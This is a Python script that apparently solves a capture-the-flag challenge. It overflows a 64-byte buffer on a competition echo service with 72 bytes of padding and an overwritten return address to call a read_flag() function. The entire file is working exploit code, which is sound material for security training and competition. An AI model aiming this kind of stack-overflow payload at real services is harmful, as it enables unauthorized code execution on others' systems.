#!/usr/bin/env python3

import socket
import struct
import time

def exploit():
    """
    Echo Service Buffer Overflow Exploit
    
    This exploit takes advantage of a buffer overflow vulnerability in the
    vuln() function where fgets() reads 200 bytes into a 64-byte buffer.
    
    We overwrite the return address to call the read_flag() function.
    """
    
    HOST = 'chals.uscc-cyberbowl-2025.ctf.institute'
    PORT = 3014
    
    # Address of read_flag function (based on our analysis)
    READ_FLAG_ADDR = 0x11e9
    
    # Create the payload
    # Buffer: 64 bytes
    # RBP: 8 bytes
    # Total padding to reach return address: 72 bytes
    payload = b'A' * 72
    payload += struct.pack('<Q', READ_FLAG_ADDR)
    
    print("[*] Connecting to {}:{}...".format(HOST, PORT))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((HOST, PORT))
        
        # Receive initial banner
        banner = s.recv(1024)
        print("[*] Banner:", banner.decode().strip())
        
        # Send exploit payload
        print("[*] Sending payload ({} bytes)...".format(len(payload)))
        s.sendall(payload + b'\n')
        
        # Wait for response
        time.sleep(2)
        
        # Try to receive all data
        s.settimeout(5)
        all_data = b''
        
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                all_data += chunk
            except socket.timeout:
                break
        
        # Print response
        print("\n[*] Response:")
        print("="*60)
        print(all_data.decode('latin-1', errors='ignore'))
        print("="*60)
        
        # Check for flag
        if b'flag{' in all_data.lower() or b'uscc{' in all_data.lower():
            print("\n[+] FLAG FOUND!")
        else:
            print("\n[-] No flag found in response")
            print("[*] Raw bytes:", repr(all_data))
        
        s.close()
        
    except Exception as e:
        print("[-] Error:", e)
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    print("="*60)
    print("Echo Service Exploit")
    print("="*60)
    exploit()
